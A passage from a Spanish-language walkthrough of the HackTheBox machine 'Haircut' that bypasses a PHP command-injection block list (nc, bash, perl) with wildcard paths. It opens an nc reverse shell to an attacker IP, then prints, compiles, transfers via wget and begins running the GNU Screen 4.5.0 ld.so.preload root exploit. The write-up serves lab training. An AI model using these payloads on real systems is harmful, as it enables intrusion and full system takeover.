+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$disallowed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'%'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'|'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;';'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'python'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'nc'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'perl'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'bash'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;amp;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'#'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'{'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'['&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;']'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A este punto, ya debemos estar pensando en otra forma de acceder a la máquina con la ejecución de comandos y sin necesidad de subir una reverse shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;/bin/n? &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /bin/bas? 10.10.14.16 443&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Si lo ejecutamos y nos ponemos en escucha por el puerto 443, se nos entabla una reverse shell y podemos visualizar la flag (user.txt). Ahora nos queda escalar privilegios, por lo que enumeramos un poco el sistema.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@haircut:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+www-data@haircut:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data: 
+www-data@haircut:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
+www-data@haircut:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null
+./bin/ntfs-3g
+./bin/ping6
+./bin/fusermount
+./bin/su
+./bin/mount
+./bin/ping
+./bin/umount
+./usr/bin/sudo
+./usr/bin/pkexec
+./usr/bin/newuidmap
+./usr/bin/newgrp
+./usr/bin/newgidmap
+./usr/bin/gpasswd
+./usr/bin/at
+./usr/bin/passwd
+./usr/bin/screen-4.5.0
+./usr/bin/chsh
+./usr/bin/chfn
+./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/lib/snapd/snap-confine
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/openssh/ssh-keysign
+./usr/lib/policykit-1/polkit-agent-helper-1
+www-data@haircut:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;screen-4.5.0&lt;/code&gt;, así que vamos a buscar un posible exploit público asociado:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit screen 4.5.0
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+ Exploit Title                                                                                 |  Path
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+GNU Screen 4.5.0 - Local Privilege Escalation                                                  | linux/local/41154.sh
+GNU Screen 4.5.0 - Local Privilege Escalation &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PoC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                            | linux/local/41152.txt
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+Shellcodes: No Results
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos dos recursos, un script en bash y otro una prueba de concepto (PoC). Para este caso utilizaremos el script; sin embargo, no vamos a ejecutarlo en la máquina víctima, vamos a ver que hace primeramente:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; linux/local/41154.sh
+  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/41154
+     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
+File Type: Bourne-Again shell script, ASCII text executable, with CRLF line terminators
+
+Copied to: /home/k4miyo/Documentos/HTB/Haircut/exploits/41154.sh
+
+
+❯ &lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;41154.sh screen_privesc.sh
+❯ catn screen_privesc.sh
+&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# screenroot.sh&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# setuid screen v4.5.0 local root exploit&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# abuses ld.so.preload overwriting to get root.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# HACK THE PLANET&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# ~ infodox (25/1/2017) &lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;~ gnu/screenroot ~&quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] First, we create our shell and library...&quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt; &amp;gt; /tmp/libhax.c
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown(&quot;/tmp/rootshell&quot;, 0, 0);
+    chmod(&quot;/tmp/rootshell&quot;, 04755);
+    unlink(&quot;/etc/ld.so.preload&quot;);
+    printf(&quot;[+] done!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;);
+}
+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
+&lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-fPIC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-shared&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ldl&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /tmp/libhax.so /tmp/libhax.c
+&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /tmp/libhax.c
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt; &amp;gt; /tmp/rootshell.c
+#include &amp;lt;stdio.h&amp;gt;
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp(&quot;/bin/sh&quot;, NULL, NULL);
+}
+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
+&lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /tmp/rootshell /tmp/rootshell.c
+&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /tmp/rootshell.c
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Now we create our /etc/ld.so.preload file...&quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /etc
+&lt;span class=&quot;nb&quot;&gt;umask &lt;/span&gt;000 &lt;span class=&quot;c&quot;&gt;# because&lt;/span&gt;
+screen &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; ld.so.preload &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a/tmp/libhax.so&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# newline needed&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Triggering...&quot;&lt;/span&gt;
+screen &lt;span class=&quot;nt&quot;&gt;-ls&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# screen itself is setuid, so... &lt;/span&gt;
+/tmp/rootshell# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Analizando un poco el script, primero crea un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libhax.c&lt;/code&gt; y lo compila como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libhax.so&lt;/code&gt;; asi que vamos a realizar esta parte, creando dicho archivo y compilandolo.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__attribute__&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__constructor__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dropshell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;chown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/rootshell&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;chmod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/rootshell&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;04755&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;unlink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/etc/ld.so.preload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] done!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ gcc &lt;span class=&quot;nt&quot;&gt;-fPIC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-shared&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ldl&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; libhax.so libhax.c
+
+libhax.c: In &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ‘dropshell’:
+libhax.c:7:5: warning: implicit declaration of &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ‘chmod’ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wimplicit-function-declaration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+    7 |     &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/tmp/rootshell&quot;&lt;/span&gt;, 04755&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      |     ^~~~~
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos aparece un &lt;strong&gt;Warning&lt;/strong&gt;, pero no hay problema. Ahora borramos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libhax.c&lt;/code&gt;, creamos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rootshell.c&lt;/code&gt; y lo compilamos:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;setuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;setgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;seteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;setegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;execvp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;libhax.c
+❯ gcc &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; rootshell rootshell.c
+rootshell.c: In &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ‘main’:
+rootshell.c:3:5: warning: implicit declaration of &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ‘setuid’ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wimplicit-function-declaration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+    3 |     setuid&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      |     ^~~~~~
+rootshell.c:4:5: warning: implicit declaration of &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ‘setgid’ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wimplicit-function-declaration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+    4 |     setgid&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      |     ^~~~~~
+rootshell.c:5:5: warning: implicit declaration of &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ‘seteuid’ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wimplicit-function-declaration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+    5 |     seteuid&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      |     ^~~~~~~
+rootshell.c:6:5: warning: implicit declaration of &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ‘setegid’ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wimplicit-function-declaration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+    6 |     setegid&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      |     ^~~~~~~
+rootshell.c:7:5: warning: implicit declaration of &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ‘execvp’ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wimplicit-function-declaration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+    7 |     execvp&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;, NULL, NULL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+      |     ^~~~~~
+rootshell.c:7:5: warning: too many arguments to built-in &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ‘execvp’ expecting 2 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wbuiltin-declaration-mismatch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+❯ &lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;rootshell.c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De igual forma, nos salen unos &lt;strong&gt;Warning&lt;/strong&gt;, pero no hay problema. Ahora tenemos de transferir los archivos resultantes a la máquina víctima en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/&lt;/code&gt; y lo haremos compartiendo un servidor HTTP con python y la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
+10.10.10.24 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;18/Oct/2021 21:38:49] &lt;span class=&quot;s2&quot;&gt;&quot;GET /libhax.so HTTP/1.1&quot;&lt;/span&gt; 200 -
+10.10.10.24 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;18/Oct/2021 21:38:58] &lt;span class=&quot;s2&quot;&gt;&quot;GET /rootshell HTTP/1.1&quot;&lt;/span&gt; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@haircut:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
+www-data@haircut:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://10.10.14.16/libhax.so
+&lt;span class=&quot;nt&quot;&gt;--2021-10-19&lt;/span&gt; 04:43:40--  http://10.10.14.16/libhax.so
+Connecting to 10.10.14.16:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16136 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;16K&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;application/octet-stream]
+Saving to: &lt;span class=&quot;s1&quot;&gt;'libhax.so'&lt;/span&gt;
+
+libhax.so                        100%[&lt;span class=&quot;o&quot;&gt;=======================================================&amp;gt;]&lt;/span&gt;  15.76K  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.-KB/s    &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.1s    
+
+2021-10-19 04:43:41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;114 KB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - &lt;span class=&quot;s1&quot;&gt;'libhax.so'&lt;/span&gt; saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;16136/16136]
+
+www-data@haircut:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://10.10.14.16/rootshell
+&lt;span class=&quot;nt&quot;&gt;--2021-10-19&lt;/span&gt; 04:43:49--  http://10.10.14.16/rootshell
+Connecting to 10.10.14.16:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16816 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;16K&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;application/octet-stream]
+Saving to: &lt;span class=&quot;s1&quot;&gt;'rootshell'&lt;/span&gt;
+
+rootshell                        100%[&lt;span class=&quot;o&quot;&gt;=======================================================&amp;gt;]&lt;/span&gt;  16.42K  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.-KB/s    &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.1s    
+
+2021-10-19 04:43:50 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;119 KB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - &lt;span class=&quot;s1&quot;&gt;'rootshell'&lt;/span&gt; saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;16816/16816]
+
+www-data@haircut:/tmp&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora ejecutamos los siguientes comando de acuerdo con lo que indica el script:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@haircut:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /etc
+www-data@haircut:/etc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;umask &lt;/span&gt;000
